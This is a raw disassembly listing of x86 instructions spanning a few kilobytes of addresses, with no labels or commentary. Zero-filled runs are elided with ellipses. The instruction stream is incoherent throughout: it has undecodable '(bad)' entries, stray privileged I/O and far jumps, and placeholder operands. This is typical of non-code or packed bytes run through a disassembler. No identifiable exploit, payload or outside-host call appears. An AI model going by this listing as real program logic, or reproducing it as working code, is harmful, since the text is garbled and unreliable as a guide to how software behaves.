  416b80:	shr    BYTE PTR ds:0x2f8cff42,1
  416b86:	mov    eax,0xa3207f64
  416b8b:	fwait
  416b8c:	out    dx,al
  416b8d:	pop    ebx
  416b8e:	mov    ch,0xf1
  416b90:	fld    DWORD PTR [eax]
	...
  416bf2:	add    BYTE PTR [eax],al
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x1c5b70a9
  416c01:	xor    ebp,DWORD PTR ds:0xf072a2
  416c07:	add    BYTE PTR ds:0xe1000001,al
  416c0d:	jns    0x416bba
  416c0f:	outs   dx,DWORD PTR ds:[esi]
  416c10:	shl    BYTE PTR [edi],0x6b
  416c13:	lds    esi,FWORD PTR [ebx]
  416c15:	lea    esi,[esi]
  416c17:	mov    ah,0x4c
  416c19:	cs aad 0x58
  416c1c:	pop    esi
  416c1d:	pop    esi
  416c1e:	push   ebx
  416c1f:	out    dx,eax
  416c20:	mov    edi,0x882373fa
  416c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c26:	mov    dh,0x22
  416c28:	fisubr WORD PTR [ecx]
  416c2b:	ins    DWORD PTR es:[edi],dx
  416c2c:	sbb    ebx,ecx
  416c2e:	lds    edi,FWORD PTR [eax+0x14e9f083]
  416c34:	lea    edi,[ebx-0x5b]
  416c37:	(bad)
  416c3a:	push   ss
  416c3b:	xor    edi,DWORD PTR [ebx+0x31]
  416c3e:	mov    dl,0x10
  416c41:	dec    eax
  416c42:	mov    bh,0xd
  416c44:	sbb    ebp,DWORD PTR [edi]
  416c46:	rol    BYTE PTR [ecx],cl
  416c48:	mov    eax,0x3be399e5
  416c4d:	xchg   eax,ebx
  416c4f:	sub    DWORD PTR [eax-0x5f],ecx
  416c52:	pop    eax
  416c53:	push   ebx
  416c54:	sbb    edx,esp
  416c56:	dec    esp
  416c57:	mov    ds:0xab9cf53e,eax
  416c5c:	inc    DWORD PTR [eax+0x7c]
  416c5f:	push   0x42
  416c61:	pusha  
  416c62:	enter  0x9ac4,0x77
  416c66:	dec    ebp
  416c67:	push   edx
  416c68:	loopne 0x416cb4
  416c6a:	stos   BYTE PTR es:[edi],al
  416c6b:	nop
  416c6c:	sub    al,0x81
  416c6e:	test   DWORD PTR ds:0xb760a47,ebp
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	imul   ebx,edx,0xdba03003
  416c7b:	bound  ebp,QWORD PTR [ecx]
  416c7d:	jp     0x416cc2
  416c7f:	xchg   esp,eax
  416c80:	xchg   esp,eax
  416c81:	lahf   
  416c82:	loop   0x416c3a
  416c84:	mov    al,ds:0xe5cb8c2e
  416c89:	xor    edx,DWORD PTR [eax-0x5fd27141]
  416c8f:	lods   al,BYTE PTR ds:[esi]
  416c90:	sub    eax,0x57355fcd
  416c95:	mov    al,BYTE PTR [eax-0x15]
  416c98:	mov    ebx,0xd13ddb0c
  416c9d:	scas   al,BYTE PTR es:[edi]
  416c9e:	xchg   ebx,eax
  416c9f:	pop    edi
  416ca0:	sahf   
  416ca1:	adc    al,0x48
  416ca3:	jo     0x416cb0
  416ca5:	mov    ch,0x5a
  416ca7:	xchg   ebx,eax
  416ca8:	xchg   edi,eax
  416ca9:	xchg   ecx,eax
  416caa:	adc    ah,bh
  416cac:	add    ch,BYTE PTR [ebx+0x74]
  416caf:	inc    ecx
  416cb0:	leave  
  416cb1:	jmp    0x416cce
  416cb3:	jns    0x416c4d
  416cb5:	mov    ebx,0x82666d06
  416cba:	lea    edx,[ebx-0x739500c4]
  416cc0:	repnz in al,dx
  416cc2:	cmc    
  416cc3:	fbstp  TBYTE PTR ds:0x2688e8a8
  416cc9:	cdq    
  416cca:	mov    eax,ds:0xbc5ad7e7
  416ccf:	das    
  416cd0:	pushf  
  416cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cd2:	in     eax,dx
  416cd3:	push   esi
  416cd4:	or     BYTE PTR [ebx+eax*1-0x78],0x12
  416cd9:	lock test al,0x52
  416cdc:	jb     0x416d16
  416cde:	outs   dx,BYTE PTR ds:[esi]
  416cdf:	sub    ecx,DWORD PTR [eax-0x2e]
  416ce2:	pop    edi
  416ce3:	push   ebp
  416ce4:	and    edi,DWORD PTR ds:0xd1dbecce
  416cea:	loop   0x416d27
  416cec:	jge    0x416d6b
  416cee:	xchg   dh,ch
  416cf0:	lock xlat BYTE PTR ds:[ebx]
  416cf2:	pop    ss
  416cf3:	jg     0x416c80
  416cf5:	mov    cl,0x65
  416cf7:	mov    al,0x21
  416cf9:	test   DWORD PTR [esi],0x675c345d
  416cff:	and    edi,ebx
  416d01:	inc    esp
  416d02:	adc    al,0xb0
  416d04:	adc    eax,0xfeec0ddf
  416d09:	std    
  416d0a:	test   eax,0xcac06f87
  416d0f:	icebp  
  416d10:	test   DWORD PTR [eax],0x0
	...
  416d72:	add    BYTE PTR [eax],al
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	xor    BYTE PTR [ecx],0xb4
  416d83:	div    BYTE PTR [edi-0xf]
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    eax,0x48000001
  416d8d:	out    0x4f,eax
  416d8f:	outs   dx,BYTE PTR ds:[esi]
  416d90:	rcl    DWORD PTR [edx+0x2d],cl
  416d93:	pop    edx
  416d94:	add    esp,DWORD PTR [esi]
  416d96:	xchg   esp,eax
  416d97:	xor    dl,ch
  416d99:	push   esp
  416d9a:	sub    ah,bl
  416d9c:	adc    eax,0xafb22a91
  416da1:	xchg   BYTE PTR [ebp-0x46904b36],bl
  416da7:	push   edx
  416da8:	jge    0x416d75
  416daa:	outs   dx,DWORD PTR ds:[esi]
  416dab:	xor    ah,BYTE PTR ds:0xe8fe29d5
  416db1:	jmp    0x9463a25c
  416db6:	aam    0xad
  416db8:	ja     0x416d76
  416dba:	adc    ecx,DWORD PTR [ebp-0x3a0eb8e7]
  416dc0:	shl    BYTE PTR [edx],cl
  416dc2:	std    
  416dc3:	int3   
  416dc4:	fst    DWORD PTR [eax+0x40]
  416dc7:	fisttp WORD PTR [esi+0x49]
  416dca:	jp     0x416db9
  416dcc:	out    0x69,al
  416dce:	push   0x3f
  416dd0:	dec    edx
  416dd1:	mov    DWORD PTR [edi+0x95ee4b5],esi
  416dd7:	cli    
  416dd8:	mov    dh,0x90
  416dda:	inc    esp
  416ddb:	call   0x23ece6bb
  416de0:	fwait
  416de1:	adc    bl,BYTE PTR [ebx-0x60d9e66c]
  416de7:	jo     0x416d6b
  416de9:	psrld  mm7,mm6
  416dec:	nop
  416ded:	or     esi,ebp
  416def:	cmp    eax,0x8d5a2302
  416df4:	mov    edx,edi
  416df6:	or     BYTE PTR [ecx],bl
  416df8:	mov    ebp,0xca7673df
  416dfd:	dec    esp
  416dfe:	mov    al,0x8c
  416e00:	adc    DWORD PTR ds:0xf7882ba,ebp
  416e06:	adc    al,0x4
  416e08:	inc    DWORD PTR [ecx+0x2c558ef4]
  416e0e:	cmp    eax,0xae533443
  416e13:	cmovae edx,edi
  416e16:	out    0x47,al
  416e18:	scas   al,BYTE PTR es:[edi]
  416e19:	lahf   
  416e1a:	ins    BYTE PTR es:[edi],dx
  416e1b:	ins    BYTE PTR es:[edi],dx
  416e1c:	fnsave [edi]
  416e1e:	retf   
  416e1f:	xor    esp,DWORD PTR ds:0xfaadace2
  416e25:	adc    dl,cl
  416e27:	int3   
  416e28:	ret    
  416e29:	shl    esi,0x36
  416e2c:	xor    cl,BYTE PTR [ebx+0x1d]
  416e2f:	and    eax,0x953cf1d0
  416e34:	push   ds
  416e35:	or     esi,esi
  416e37:	xor    DWORD PTR [ebp-0x13b1a6f8],eax
  416e3d:	cld    
  416e3e:	aas    
  416e3f:	(bad)  
  416e40:	neg    BYTE PTR [edi-0x5e]
  416e43:	add    dl,BYTE PTR [esi]
  416e45:	jmp    0x1d99fac4
  416e4a:	test   al,0x9c
  416e4c:	jb     0x416e68
  416e4e:	mov    ebx,0xe1430732
  416e53:	arpl   WORD PTR [edx-0x2bde8f1f],dx
  416e59:	fst    QWORD PTR [edi+esi*8]
  416e5c:	pop    DWORD PTR [ebx+0x763e39de]
  416e62:	js     0x416e57
  416e64:	push   esp
  416e65:	js     0x416e37
  416e67:	cmp    eax,0x83a8577c
  416e6c:	bound  edi,QWORD PTR [ebx-0x698f2cfa]
  416e72:	cmp    DWORD PTR [eax],ebx
  416e74:	inc    ebx
  416e75:	push   es
  416e76:	pushf  
  416e77:	mov    edx,fs
  416e79:	push   ds
  416e7a:	dec    esi
  416e7b:	cs loope 0x416e33
  416e7e:	jg     0x416e3e
  416e80:	mov    al,fs:0xa7ade833
  416e86:	mov    bh,bl
  416e88:	mov    ecx,0xe320547d
  416e8d:	inc    esi
  416e8e:	sub    cl,ch
  416e90:	inc    DWORD PTR [eax]
	...
  416ef2:	add    BYTE PTR [eax],al
  416ef4:	mov    edi,0xae6d8e19
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x99a28eea
  416f02:	mov    al,ds:0xf27cd4
  416f07:	add    BYTE PTR ds:0x6f000001,al
  416f0d:	es lahf 
  416f0f:	std    
  416f10:	xchg   DWORD PTR fs:[ecx-0x42],ebp
  416f14:	repz push ds
  416f16:	cmp    eax,0x81fed1fd
  416f1b:	mov    ds:0x3d3ee321,al
  416f20:	mov    ecx,0x69691939
  416f25:	sbb    DWORD PTR [eax],ebx
  416f27:	ret    0xcbb5
  416f2a:	ret    0x89d6
  416f2d:	mov    ds:0x470a239a,al
  416f32:	and    eax,0x37cfed7c
  416f37:	inc    edi
  416f38:	mov    ?,ecx
  416f3a:	add    cl,bl
  416f3c:	pusha  
  416f3d:	mov    DWORD PTR [esi+0x4c961cca],ebp
  416f43:	addr16 jge 0x416ee6
  416f46:	pop    esi
  416f47:	jl     0x416efb
  416f49:	and    BYTE PTR ds:0x688c5e2b,ch
  416f4f:	iret   
  416f50:	test   BYTE PTR [esi+0x52],bh
  416f53:	mov    DWORD PTR [esi-0x6c05a20c],ebx
  416f59:	dec    edx
  416f5a:	test   eax,0xfe29dfb7
  416f5f:	xchg   esi,eax
  416f60:	dec    ecx
  416f61:	mov    ds:0x51be7175,eax
  416f66:	or     edx,DWORD PTR [ecx]
  416f68:	and    ch,BYTE PTR [edi+0x28]
  416f6b:	cmp    DWORD PTR ds:0xbf5a220a,esp
  416f71:	or     eax,0x8ad2d06c
  416f76:	hlt    
  416f77:	adc    al,0x8a
  416f79:	dec    esi
  416f7a:	inc    ecx
  416f7b:	and    cl,bh
  416f7d:	mov    WORD PTR [edi+esi*8-0x64af3231],cs
  416f84:	mov    ebx,0x698f6f89
  416f89:	in     al,dx
  416f8a:	jno    0x416fe2
  416f8c:	out    0xe9,al
  416f8e:	loopne 0x416f35
  416f90:	push   ebp
  416f91:	pusha  
  416f92:	add    DWORD PTR [edi],edx
  416f94:	out    dx,eax
  416f95:	mov    bl,0x67
  416f97:	push   ebp
  416f98:	sar    BYTE PTR [ecx+ebp*1-0x5add8f2b],cl
  416f9f:	jnp    0x416fed
  416fa1:	fisubr WORD PTR [eax+0xa]
  416fa4:	dec    edi
  416fa6:	jmp    0x1a5f704f
  416fab:	mov    bh,0x5c
  416fad:	shl    BYTE PTR [ebp+0x13],1
  416fb0:	pop    ss
  416fb1:	push   esi
  416fb2:	loop   0x416f39
  416fb4:	dec    edi
  416fb5:	pop    esp
  416fb6:	mov    al,0x9d
  416fb8:	dec    edx
  416fb9:	jae    0x416fa8
  416fbb:	jp     0x41702a
  416fbd:	aad    0xd9
  416fbf:	sbb    ebx,ecx
  416fc1:	jae    0x416fad
  416fc3:	pop    edi
  416fc4:	jno    0x417042
  416fc6:	dec    eax
  416fc7:	mov    WORD PTR [eax+0x18],?
  416fca:	pop    esi
  416fcb:	push   ebx
  416fcc:	jb     0x416fbf
  416fce:	fisub  WORD PTR [eax+edx*4]
  416fd1:	or     edi,esi
  416fd3:	mov    ds:0x517da44b,al
  416fd8:	sti    
  416fd9:	mov    bl,0xa9
  416fdb:	jnp    0x417024
  416fdd:	mov    al,0xdb
  416fdf:	repnz push ecx
  416fe1:	std    
  416fe2:	stos   BYTE PTR es:[edi],al
  416fe3:	sbb    ah,BYTE PTR [edi]
  416fe5:	addr16 sub eax,0x26a5badc
  416feb:	jge    0x41702e
  416fed:	xchg   BYTE PTR [esi],ch
  416fef:	imul   esi,edi,0xb0edddca
  416ff5:	std    
  416ff6:	xchg   esp,eax
  416ff7:	xchg   ebp,eax
  416ff8:	or     edi,DWORD PTR [ebp+0x1b70334c]
  416ffe:	int3   
  416fff:	and    al,dh
  417001:	call   0x5be44801
  417006:	cmc    
  417007:	in     al,0x1b
  417009:	sbb    DWORD PTR [edi+0x59],ebx
  41700c:	jl     0x416f99
  41700e:	pop    esi
  41700f:	mov    eax,ds:0x8d
	...
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    edi,edi
  417081:	jle    0x4170fb
  417083:	repnz xor ebx,0x1050000
  41708a:	add    BYTE PTR [eax],al
  41708c:	mov    ebp,0x8aab5542
  417091:	or     al,0x99
  417093:	rcr    DWORD PTR [esi-0x717bbbd1],0xe9
  41709a:	fsub   DWORD PTR [esi]
  41709c:	add    DWORD PTR gs:[edi+0x59fc1c71],ecx
  4170a3:	addr16 stc 
  4170a5:	in     al,0x4e
  4170a7:	mov    esi,0x999a2fa9
  4170ac:	mov    WORD PTR [esi],ss
  4170ae:	sar    esi,0x27
  4170b1:	and    ch,0xc
  4170b4:	xor    cl,BYTE PTR [edx-0x7b079c78]
  4170ba:	ret    
  4170bb:	pop    ecx
  4170bc:	shl    DWORD PTR [ebx],1
  4170be:	xor    BYTE PTR [edx],ah
  4170c0:	xchg   edx,eax
  4170c1:	mov    ebx,0xd2af03d2
  4170c6:	sbb    eax,0x389e09eb
  4170cb:	(bad)  
  4170cc:	mov    ch,0x86
  4170ce:	nop
  4170cf:	adc    eax,0x57665ad6
  4170d4:	xchg   edx,eax
  4170d5:	mov    cl,0x76
  4170d7:	mov    esp,0x69236f48
  4170dd:	mov    fs,edi
  4170df:	daa    
  4170e0:	add    DWORD PTR [edi-0x56],ebx
  4170e3:	pop    esp
  4170e4:	stos   BYTE PTR es:[edi],al
  4170e5:	loop   0x417139
  4170e7:	ret    
  4170e8:	ins    DWORD PTR es:[edi],dx
  4170e9:	adc    BYTE PTR [eax],ch
  4170eb:	pop    ebp
  4170ec:	sub    eax,0xeed8c90f
  4170f1:	ret    
  4170f2:	popa   
  4170f3:	lds    ebp,FWORD PTR [ecx+0x2eae717b]
  4170f9:	sub    eax,0xaf6d0cb6
  4170fe:	fst    st(6)
  417100:	daa    
  417101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417102:	addr16 test al,0x79
  417105:	cdq    
  417106:	(bad)  
  417107:	popf   
  417108:	lea    esi,[esi-0x7a95f741]
  41710e:	inc    edx
  41710f:	test   eax,0x401ae62c
  417114:	shl    BYTE PTR [ebx+0x3],1
  417117:	xchg   ebx,eax
  417118:	mov    DWORD PTR [esp+eiz*8],ebx
  41711b:	jbe    0x417129
  41711d:	(bad)  
  41711e:	scas   al,BYTE PTR es:[edi]
  41711f:	call   0xd829d3db
  417124:	inc    ebp
  417125:	(bad)  
  417126:	jo     0x4170ea
  417128:	mov    ecx,0x64d3aeee
  41712d:	or     BYTE PTR [ebx+0x6c],bl
  417130:	nop
  417131:	(bad)  
  417132:	dec    ecx
  417133:	pop    ds
  417134:	pop    esi
  417135:	ror    dh,1
  417137:	imul   BYTE PTR [edx+0xbc45351]
  41713d:	mov    bh,0xb4
  41713f:	add    ebx,esp
  417141:	jp     0x41715e
  417143:	jge    0x4171be
  417145:	enter  0x2394,0x1a
  417149:	sub    al,0x54
  41714b:	shl    BYTE PTR [esi+0x692abd12],0xbe
  417152:	mov    ebp,0x3ff22b1d
  417157:	mov    eax,fs:0x3bcb9dd8
  41715d:	(bad)  
  41715e:	push   esi
  41715f:	pop    ebp
  417160:	jne    0x417135
  417162:	or     edi,DWORD PTR [ecx+eiz*1]
  417165:	xor    ch,BYTE PTR [ebp+0x4b]
  417168:	jle    0x4171c5
  41716a:	in     eax,0xc3
  41716c:	add    esi,DWORD PTR [ecx]
  41716e:	test   DWORD PTR [edi+ebx*2-0x5ff6b1d9],ebp
  417175:	or     eax,0x34370120
  41717a:	das    
  41717b:	or     eax,0x4e679948
  417180:	outs   dx,DWORD PTR ds:[esi]
  417181:	lds    edx,FWORD PTR [eax-0x55]
  417184:	dec    ebp
  417185:	push   ss
  417186:	cmp    BYTE PTR [edi],dl
  417188:	hlt    
  417189:	add    al,0x7f
  41718b:	cmp    DWORD PTR [edi-0x3b358f72],esp
	...
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	inc    eax
  417201:	ins    BYTE PTR es:[edi],dx
  417202:	pop    ds
  417203:	pop    ecx
  417204:	xchg   ah,dh
  417206:	add    BYTE PTR [eax],al
  417208:	add    eax,0x2c000001
  41720d:	sub    DWORD PTR [esp+edx*2-0x7a9c5492],ebp
  417214:	mov    BYTE PTR [esi-0x42],bh
  417217:	std    
  417218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417219:	and    bl,ch
  41721b:	mov    bh,0x71
  41721d:	test   ebx,esp
  41721f:	pop    es
  417220:	adc    edx,DWORD PTR [edi-0x47fc98b5]
  417226:	cdq    
  417227:	xor    esi,DWORD PTR [edx+edx*2-0x5d157245]
  41722e:	xchg   esi,eax
  41722f:	sub    al,0x56
  417231:	cmc    
  417232:	jns    0x4171da
  417234:	ins    DWORD PTR es:[edi],dx
  417235:	fmul   DWORD PTR [edi+ecx*8+0x750f214b]
  41723c:	pop    ecx
  41723d:	sbb    eax,0xac065768
  417242:	pop    ebp
  417243:	inc    ecx
  417244:	popa   
  417245:	and    bh,BYTE PTR [ecx+0x69ff2192]
  41724b:	push   esp
  41724c:	out    0xbb,eax
  41724e:	mov    bh,0xab
  417250:	call   0xf4d2:0x86ea59b7
  417257:	jns    0x4171fb
  417259:	addr16 loopne 0x41725e
  41725c:	adc    BYTE PTR ds:0x57590c42,0xbe
  417263:	aas    
  417264:	jmp    0xebca:0x2f720632
  41726b:	xor    BYTE PTR [eax+eax*2-0x23],ah
  41726f:	add    al,0xe3
  417271:	sub    DWORD PTR [ebx],edi
  417273:	mov    esp,?
  417275:	add    esp,DWORD PTR [edx+edx*1]
  417278:	pop    edx
  417279:	mov    edx,0x884bc1b1
  41727e:	repnz pop ds
  417280:	add    BYTE PTR [edx-0xaf6a4d4],dl
  417286:	dec    esp
  417287:	int3   
  417288:	push   ebx
  417289:	idiv   DWORD PTR [esi-0x32]
  41728c:	call   0xc204:0x3659c18f
  417293:	retf   
  417294:	inc    edi
  417295:	stos   BYTE PTR es:[edi],al
  417296:	push   edx
  417297:	sahf   
  417298:	retf   
  417299:	pop    ebp
  41729a:	dec    edx
  41729b:	fcomi  st,st(2)
  41729d:	mov    al,ds:0x2204a2c0
  4172a2:	out    dx,eax
  4172a3:	(bad)
  4172a6:	test   DWORD PTR [edx+0x6371f01d],eax
  4172ac:	jl     0x417289
  4172ae:	lea    esp,[eax]
  4172b0:	data16 and BYTE PTR [ebx+0xd],ch
  4172b4:	jns    0x417317
  4172b6:	sub    ecx,esp
  4172b8:	lock pop ss
  4172ba:	add    al,BYTE PTR [ebx-0x22]
  4172bd:	sahf   
  4172be:	mov    bl,0x8e
  4172c0:	cmp    DWORD PTR [esi+0x34f7452b],eax
  4172c6:	mov    ds:0x5bc8b220,al
  4172cb:	jecxz  0x4172e9
  4172cd:	pop    es
  4172ce:	pop    esp
  4172cf:	rol    BYTE PTR [ecx],1
  4172d1:	bnd ret 0x688e
  4172d5:	jb     0x417340
  4172d7:	test   al,0x4b
  4172d9:	daa    
  4172da:	jmp    0x417349
  4172dc:	into   
  4172dd:	xchg   DWORD PTR [ebp-0x17],ecx
  4172e0:	ficomp WORD PTR [ebp+0x4f]
  4172e3:	rcr    BYTE PTR [ebx+0x7b41aed1],cl
  4172e9:	push   eax
  4172ea:	push   0x1d42f029
  4172ef:	cld    
  4172f0:	in     eax,0xa1
  4172f2:	rcr    BYTE PTR [edx+0x1ab76653],0xd8
  4172f9:	dec    ebx
  4172fa:	retf   0x21cd
  4172fd:	mov    eax,0xb0bd9616
  417302:	dec    ebp
  417303:	adc    DWORD PTR [ecx],edx
  417305:	aas    
  417306:	jb     0x417385
  417308:	or     eax,0x729b1cc
  41730d:	push   eax
  41730e:	stos   BYTE PTR es:[edi],al
  41730f:	or     dl,ch
	...
  417371:	add    BYTE PTR [eax],al
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	(bad)  
  417381:	lods   eax,DWORD PTR ds:[esi]
  417382:	mov    ds:0xf58b99,eax
  417387:	add    BYTE PTR ds:0xa2000001,al
  41738d:	ds stos BYTE PTR es:[edi],al
  41738f:	shl    BYTE PTR [ecx],cl
  417391:	imul   eax,DWORD PTR [esi],0x5829bf90
  417397:	mul    DWORD PTR [edi-0x33889998]
  41739d:	mov    dh,0xe1
  41739f:	int    0xac
  4173a1:	xchg   edx,eax
  4173a2:	mov    bl,0x13
  4173a4:	jmp    0x7077e02b
  4173a9:	xor    DWORD PTR [edi+edx*2],esp
  4173ac:	adc    ch,BYTE PTR [ebx]
  4173ae:	pop    esp
  4173af:	and    dh,dh
  4173b1:	xchg   ecx,eax
  4173b2:	dec    esi
  4173b3:	jbe    0x4173a8
  4173b5:	jne    0x417356
  4173b7:	inc    ebx
  4173b8:	loope  0x41735e
  4173ba:	push   eax
  4173bb:	and    DWORD PTR [ebp-0x6f],ecx
  4173be:	mov    esp,DWORD PTR [ebp+0x5d5660eb]
  4173c4:	int    0xe1
  4173c6:	daa    
  4173c7:	jle    0x41736d
  4173c9:	xchg   esi,eax
  4173ca:	lock push ds
  4173cc:	mov    ch,0x27
  4173ce:	(bad)  
  4173cf:	cli    
  4173d0:	dec    edx
  4173d1:	add    al,0x5c
  4173d3:	xor    eax,0xcc9dcfe0
  4173d8:	cli    
  4173d9:	jne    0x417430
  4173db:	xchg   edx,eax
  4173dc:	jmp    DWORD PTR [ebx]
  4173de:	add    eax,0xff1831a0
  4173e3:	nop
  4173e4:	jae    0x41743c
  4173e6:	cmc    
  4173e7:	mov    edx,0x4e5438cb
  4173ec:	ror    bh,1
  4173ee:	mov    ecx,0xa3936382
  4173f3:	repz sbb ecx,DWORD PTR [ebx]
  4173f6:	cwde   
  4173f7:	retf   
  4173f8:	test   DWORD PTR [edi-0x33],esi
  4173fb:	inc    esi
  4173fc:	add    esp,DWORD PTR [esi+eiz*1+0x629ec9a7]
  417403:	std    
  417404:	jbe    0x4173d7
  417406:	scas   eax,DWORD PTR es:[edi]
  417407:	pop    edi
  417408:	mov    eax,ds:0xc3087e2f
  41740d:	pop    edx
  41740e:	data16 outs dx,BYTE PTR ds:[esi]
  417410:	or     eax,0xfd1639fc
  417415:	pop    eax
  417416:	dec    BYTE PTR [ebx-0x67176150]
  41741c:	cdq    
  41741d:	nop
  41741e:	cmp    DWORD PTR [esi-0x724c8637],0xfffffff0
  417425:	arpl   WORD PTR [ecx+0x628b3b63],si
  41742b:	enter  0x9a04,0x18
  41742f:	inc    edi
  417430:	fnstcw WORD PTR [esi+0x49]
  417433:	or     dh,BYTE PTR [ebp-0x7dda4d7f]
  417439:	inc    eax
  41743a:	sti    
  41743b:	imul   ecx,DWORD PTR [edi-0xc],0x2d
  41743f:	inc    esp
  417440:	(bad)  
  417441:	dec    eax
  417442:	push   edx
  417443:	and    BYTE PTR [ecx],cl
  417445:	mov    BYTE PTR [edi-0x14160315],bl
  41744b:	sub    eax,0xd4db6028
  417450:	cdq    
  417451:	and    eax,0x52531ae5
  417456:	pop    edx
  417457:	out    dx,al
  417458:	stos   DWORD PTR es:[edi],eax
  417459:	(bad)  
  41745a:	mov    eax,0xd68d9ee6
  41745f:	std    
  417460:	in     eax,dx
  417461:	cmp    ebp,DWORD PTR ds:0xe6a5b7ec
  417467:	push   eax
  417468:	pop    ebx
  417469:	call   0x3ab94b7e
  41746e:	ja     0x41744a
  417470:	int    0x7e
  417472:	rol    BYTE PTR [ecx],1
  417474:	mov    edi,0x7c3502d
  417479:	in     eax,dx
  41747a:	in     eax,dx
  41747b:	adc    eax,0x5e750879
  417480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417482:	jae    0x41744c
  417484:	mov    ebp,0x45fee6ea
  417489:	mov    ah,0x6d
  41748b:	into   
  41748c:	mov    ?,esp
  41748e:	out    0xce,al
  417490:	push   eax
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	and    BYTE PTR [ebx+esi*8-0x26],al
  417504:	nop
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    eax,0x64000001
  41750d:	cmp    BYTE PTR [ebx-0x2bc4d018],ch
  417513:	scas   eax,DWORD PTR es:[edi]
  417514:	out    0x72,eax
  417516:	dec    esp
  417517:	inc    esi
  417518:	cwde   
  417519:	imul   esp,DWORD PTR [edi+0x67],0xe37af05e
  417520:	inc    edx
  417521:	jmp    0x417591
  417523:	push   ss
  417524:	sub    DWORD PTR [esi],ebx
  417526:	jae    0x41757a
  417528:	mov    eax,0x6dd653d7
  41752d:	cmp    al,0xf9
  41752f:	fcomp  DWORD PTR [esi+0x1d431785]
  417535:	xor    ecx,ebp
  417537:	repz cdq 
  417539:	mov    ch,0x45
  41753b:	and    BYTE PTR [ecx],0x39
  41753e:	ins    BYTE PTR es:[edi],dx
  41753f:	sub    edi,DWORD PTR [ecx+esi*8-0x46]
  417543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417544:	(bad)  
  417545:	dec    ecx
  417546:	mov    eax,ds:0xf2291728
  41754b:	aaa    
  41754c:	mov    BYTE PTR [ecx],0xf8
  41754f:	mov    al,BYTE PTR [esi]
  417551:	sub    dh,BYTE PTR [esp+ecx*4+0x76dcfa7e]
  417558:	cmp    al,0x7f
  41755a:	xchg   esi,eax
  41755b:	xchg   esi,eax
  41755c:	or     edx,DWORD PTR [edx-0x4345098a]
  417562:	out    0x80,al
  417564:	rol    dh,cl
  417566:	xchg   ecx,eax
  417567:	pop    eax
  417568:	rcr    DWORD PTR [ebp+esi*2+0x26],cl
  41756c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41756d:	dec    ebp
  41756e:	push   cs
  41756f:	stos   DWORD PTR es:[edi],eax
  417570:	mov    eax,0x9411b953
  417575:	cmp    BYTE PTR [edi+ebx*4-0x2877f1e0],bl
  41757c:	add    DWORD PTR [ecx-0xf],edx
  41757f:	out    0xbb,eax
  417581:	mov    al,0x23
  417583:	and    eax,0x2ac84e9c
  417588:	cmp    dl,bl
  41758a:	cmp    eax,0xef301904
  41758f:	dec    ebx
  417590:	frstor [ebp-0x5e]
  417593:	xchg   esi,eax
  417594:	aaa    
  417595:	mov    esi,edi
  417597:	lods   eax,DWORD PTR ds:[esi]
  417598:	xchg   esp,eax
  417599:	xchg   edi,eax
  41759a:	ficomp WORD PTR [ebp+0x490a66ab]
  4175a0:	xchg   DWORD PTR [ebx-0x60],ecx
  4175a3:	loope  0x417577
  4175a5:	pusha  
  4175a6:	jae    0x4175d8
  4175a8:	fsub   DWORD PTR [edx+0x24]
  4175ab:	daa    
  4175ac:	out    dx,eax
  4175ad:	ror    BYTE PTR [edx],0x44
  4175b0:	std    
  4175b1:	push   0x4f7c746b
  4175b6:	mov    esp,DWORD PTR [edi]
  4175b8:	fwait
  4175b9:	pop    ecx
  4175ba:	inc    DWORD PTR [esi-0x15897d15]
  4175c0:	adc    al,BYTE PTR [edx+0x28]
  4175c3:	mov    esp,0xb8b75179
  4175c8:	test   DWORD PTR [ecx+0x2d286507],esp
  4175ce:	or     bl,ch
  4175d0:	lds    esi,FWORD PTR [eax+0xeecf246]
  4175d6:	test   al,0xd6
  4175d8:	arpl   WORD PTR [edi],sp
  4175da:	test   al,0x38
  4175dc:	jmp    0x7a704cf2
  4175e1:	sbb    al,0xb6
  4175e3:	inc    esp
  4175e4:	fcomp  QWORD PTR [ebp+0xe276aab]
  4175ea:	(bad)  
  4175eb:	int3   
  4175ec:	jl     0x4175aa
  4175ee:	adc    DWORD PTR [ebp+0x5232674a],0x67
  4175f5:	mov    eax,ds:0x19be130b
  4175fa:	or     eax,0xa7d4b0a0
  4175ff:	xchg   ebx,eax
  417600:	jne    0x4175fa
  417602:	sbb    eax,0x6dd08d46
  417607:	in     al,0x8d
  417609:	outs   dx,DWORD PTR ds:[esi]
  41760a:	out    dx,eax
  41760b:	xchg   DWORD PTR [edx+0x26],ebp
  41760e:	sub    DWORD PTR [edx],ebx
	...
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	(bad)  
  417681:	mov    ds:0xf79508d7,eax
  417686:	add    BYTE PTR [eax],al
  417688:	add    eax,0xce000001
  41768d:	ffreep st(4)
  41768f:	mov    esp,0x622dcce2
